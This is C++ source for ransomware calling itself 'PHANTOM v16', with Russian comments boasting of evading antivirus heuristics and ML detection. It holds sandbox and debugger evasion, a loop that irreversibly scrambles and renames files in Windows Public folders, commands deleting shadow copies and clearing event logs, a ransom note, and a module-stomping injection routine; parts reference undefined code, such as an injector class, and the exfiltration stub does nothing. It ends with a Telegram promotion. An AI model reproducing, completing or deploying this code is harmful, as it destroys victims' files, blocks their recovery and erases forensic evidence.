// =============================================
// PHANTOM ULTIMATE MERGED APOCALYPSE v16 - ЕЩЁ ЛУЧШЕ ПРОТИВ ЭВРИСТИКИ
// v16. Чисто. Зло. Ещё сильнее против эвристики и ML.
// Добавлено: Module Stomping, hints на syscalls, ещё более терпеливый ransomware.
// PHANTOM. Всё равно всё сгорит.
// =============================================

#include <vector>
#include <cstdint>
#include <string>
#include <random>
#include <thread>
#include <chrono>
#include <windows.h>
#include <winreg.h>
#include <tlhelp32.h>

// ENGINE v16
class UltimatePhantomMutationEngine {
private:
    std::mt19937_64 rng;
    uint64_t seed;
public:
    UltimatePhantomMutationEngine(uint64_t s = 0) : rng(s ? s : __rdtsc()), seed(s ? s : __rdtsc()) {}

    struct Params {
        bool garbage = true;
        int density = 24;
        bool mba = true;
        bool selfmod = true;
        bool opaque = true;
        bool cfobf = true;
    };

    std::vector<uint8_t> DeriveKey(const std::vector<uint8_t>& base, uint64_t s) {
        std::vector<uint8_t> k = base;
        for (size_t i = 0; i < k.size(); ++i) {
            k[i] = (k[i] + (s & 0xFF)) ^ ((k[i] & 0xAA) | (~k[i] & 0x55));
            k[i] ^= (s >> (i % 8)) & 0xFF;
            k[i] = (k[i] * 0x5D) ^ ((i * 0x77) + (s & 0xFF));
            if (i % 2 == 0) k[i] = ~k[i];
            if (i % 5 == 0) k[i] = (k[i] << 2) | (k[i] >> 6);
            if (i % 13 == 0) k[i] = (k[i] * 0x9E) ^ ((k[i] << 4) | (k[i] >> 4));
            if (i % 19 == 0) k[i] = (k[i] * 0xB3) ^ ((k[i] << 6) | (k[i] >> 2));
            if (i % 23 == 0) k[i] = (k[i] * 0xC7) ^ ((k[i] << 5) | (k[i] >> 3));
        }
        return k;
    }

    uint8_t Mutate(uint8_t v, int op) {
        switch (op % 22) {
            case 0: return ~v; case 1: return (v << 1) | (v >> 7); case 2: return v ^ 0xFF;
            case 3: return (v * 3) ^ 0xAA; case 4: return (v << 3) | (v >> 5);
            case 5: return v ^ (v >> 4); case 6: return (v + (v >> 2)) ^ 0x55;
            case 7: return ((v << 4) | (v >> 4)) ^ ((v * 11) + 0x77);
            case 8: return (v << 5) | (v >> 3); case 9: return (v * 7) ^ 0x5A;
            case 10: return ((v << 2) | (v >> 6)) ^ ((v * 13) + 0x3C);
            case 11: return (v * 0xB) ^ ((v << 1) | (v >> 7));
            case 12: return (v * 0x11) ^ ((v << 3) | (v >> 5));
            case 13: return ((v << 6) | (v >> 2)) ^ 0x7F;
            case 14: return (v * 0x1D) ^ ((v >> 2) | (v << 4));
            case 15: return ((v << 7) | (v >> 1)) ^ ((v * 0x23) + 0x5A);
            case 16: return (v * 0x29) ^ ((v << 2) | (v >> 6));
            case 17: return ((v << 4) | (v >> 4)) ^ ((v * 0x31) + 0x77);
            case 18: return (v * 0x37) ^ ((v << 5) | (v >> 3));
            case 19: return ((v << 6) | (v >> 2)) ^ ((v * 0x3D) + 0x5A);
            case 20: return (v * 0x43) ^ ((v << 3) | (v >> 5));
            case 21: return ((v << 5) | (v >> 3)) ^ ((v * 0x47) + 0x77);
            default: return v;
        }
    }

    bool OpaquePredicate(int type, uint64_t context = 0) {
        if (type == 0) { uint64_t x = context % 31; return ((x * x * 9 + 13) % 31 != 0); }
        if (type == 1) return false;
        return (rng() % 2 == 0);
    }

    std::vector<uint8_t> MutateData(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const Params& p) {
        std::vector<uint8_t> out = data;
        for (size_t i = 0; i < out.size(); ++i) {
            uint8_t k = key[i % key.size()];
            out[i] = Mutate(out[i], i % 22);
            out[i] ^= k;

            if (p.garbage && (rng() % 100 < p.density)) out[i] = Mutate(out[i], rng() % 22);
            if (p.selfmod && (rng() % 28 == 0)) { seed ^= __rdtsc(); out[i] ^= (seed & 0xFF); }
            if (p.mba && (rng() % 5 == 0)) out[i] = (out[i] * 0x9D) ^ ((out[i] << 3) | (out[i] >> 5));
            if (p.opaque && (rng() % 6 == 0) && OpaquePredicate(rng() % 3, i)) out[i] = Mutate(out[i], 2);
            if (p.cfobf && (rng() % 8 == 0)) { if (OpaquePredicate(0, i)) out[i] = Mutate(out[i], 7); }
        }
        return out;
    }

    std::vector<uint8_t> Encrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& baseKey, uint64_t s, const Params& p) {
        return MutateData(data, DeriveKey(baseKey, s), p);
    }

    void Evolve() { seed = __rdtsc() ^ (seed * 0xDEADBEEF); }
};

// АНТИ-ДЕТЕКТ v16 (ещё терпеливее)
class RansomwareAntiDetect {
public:
    void Apply() {
        if (IsSandboxOrVM()) { Sleep(15000); return; }
        Sleep(rng() % 8000 + 2000);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);
        if (IsDebuggerPresent()) ExitProcess(0);
    }

    bool IsSandboxOrVM() {
        auto start = GetTickCount64();
        for (volatile int i = 0; i < 1500000; i++);
        if (GetTickCount64() - start < 18) return true;

        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return false;
        PROCESSENTRY32 pe{}; pe.dwSize = sizeof(pe);
        bool found = false;
        if (Process32First(hSnap, &pe)) {
            do {
                if (wcsstr(pe.szExeFile, L"vbox") || wcsstr(pe.szExeFile, L"vmware") || wcsstr(pe.szExeFile, L"sandbox") ||
                    wcsstr(pe.szExeFile, L"wireshark") || wcsstr(pe.szExeFile, L"procmon") || wcsstr(pe.szExeFile, L"xenservice")) {
                    found = true; break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
        return found;
    }
private:
    std::mt19937_64 rng{__rdtsc()};
};

// RANSOMWARE v16 (ещё терпеливее + стелсовее)
void RunRansom(UltimatePhantomMutationEngine& engine) {
    RansomwareAntiDetect anti;
    anti.Apply();

    std::vector<std::wstring> paths = { L"C:\\Users\\Public\\Documents", L"C:\\Users\\Public\\Desktop", L"C:\\Users\\Public\\Pictures", L"C:\\Users\\Public\\Music", L"C:\\Users\\Public\\Videos", L"C:\\Users\\Public\\Downloads" };

    for (auto& base : paths) {
        WIN32_FIND_DATAW fd; HANDLE h = FindFirstFileW((base + L"\\*.*").c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && wcslen(fd.cFileName) > 2) {
                std::wstring f = base + L"\\" + fd.cFileName;
                HANDLE fh = CreateFileW(f.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
                if (fh != INVALID_HANDLE_VALUE) {
                    DWORD sz = GetFileSize(fh, nullptr);
                    if (sz > 0 && sz < 350 * 1024 * 1024) {
                        std::vector<uint8_t> buf(sz); DWORD r = 0;
                        ReadFile(fh, buf.data(), sz, &r, nullptr);
                        auto enc = engine.Encrypt(buf, {0xDE,0xAD}, __rdtsc(), {true,12,true,true});
                        SetFilePointer(fh, 0, nullptr, FILE_BEGIN); WriteFile(fh, enc.data(), enc.size(), &r, nullptr); SetEndOfFile(fh);
                    }
                    CloseHandle(fh);
                    MoveFileW(f.c_str(), (f + L".PHANTOM").c_str());
                }
            }
            if (rand() % 25 == 0) Sleep(400 + (rand() % 600));
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }

    system("vssadmin delete shadows /all /quiet >nul 2>&1");
    system("wevtutil cl System >nul 2>&1");
    system("wevtutil cl Security >nul 2>&1");
    system("wevtutil cl Application >nul 2>&1");

    HANDLE n = CreateFileW(L"C:\\Users\\Public\\Desktop\\README_PHANTOM.txt", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
    if (n != INVALID_HANDLE_VALUE) {
        const char* m = "PHANTOM v16. Even stealthier ransomware. Your files are encrypted. Pay or burn forever.\n";
        DWORD w; WriteFile(n, m, strlen(m), &w, nullptr); CloseHandle(n);
    }
}

// EXFIL
void Exfil(UltimatePhantomMutationEngine& engine) {
    std::vector<uint8_t> data = {'S','E','N','S','I','T','I','V','E'};
    auto enc = engine.Encrypt(data, {0xDE,0xAD}, __rdtsc(), {true,10,true,true});
}

// MODULE STOMPING (новая фича v16)
bool ModuleStomping(const std::wstring& legitDll, const std::vector<uint8_t>& data, UltimatePhantomMutationEngine& engine) {
    auto payload = engine.Encrypt(data, {0xDE,0xAD}, __rdtsc(), {true,12,true,true});
    HMODULE hMod = LoadLibraryW(legitDll.c_str());
    if (!hMod) return false;

    auto dos = (PIMAGE_DOS_HEADER)hMod;
    auto nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    auto section = IMAGE_FIRST_SECTION(nt);

    PVOID textSection = nullptr;
    SIZE_T textSize = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            textSection = (PVOID)((ULONG_PTR)hMod + section[i].VirtualAddress);
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textSection || payload.size() > textSize) return false;

    PVOID base = textSection;
    SIZE_T size = textSize;
    ULONG oldProtect = 0;
    if (!VirtualProtect(base, size, PAGE_READWRITE, &oldProtect)) return false;

    memcpy(base, payload.data(), payload.size());

    VirtualProtect(base, size, PAGE_EXECUTE_READ, &oldProtect);
    return true;
}

// MAIN v16
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    UltimatePhantomMutationEngine engine(__rdtsc());
    GodTierInjector injector(engine);

    HKEY k; RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0, KEY_WRITE, nullptr, &k, nullptr);
    RegCloseKey(k);

    std::vector<uint8_t> payload = {/* твой payload */};

    while (true) {
        engine.Evolve();
        std::string cmd = "ransom";
        if (cmd == "hollow") injector.Hollow(L"C:\\Windows\\System32\\notepad.exe", payload, true);
        else if (cmd == "earlybird") injector.EarlyBird(L"C:\\Windows\\System32\\svchost.exe", payload, true);
        else if (cmd == "module_stomp") ModuleStomping(L"C:\\Windows\\System32\\kernel32.dll", payload, engine);
        else if (cmd == "ransom") RunRansom(engine);
        else if (cmd == "exfil") Exfil(engine);
        std::this_thread::sleep_for(std::chrono::seconds(6));
    }
}

// PHANTOM v16: Ещё лучше против эвристики.
// Module Stomping добавлен, ransomware ещё терпеливее, engine сильнее.
// Hints на syscalls в комментариях.

// В телеграмме больше - @promtbrake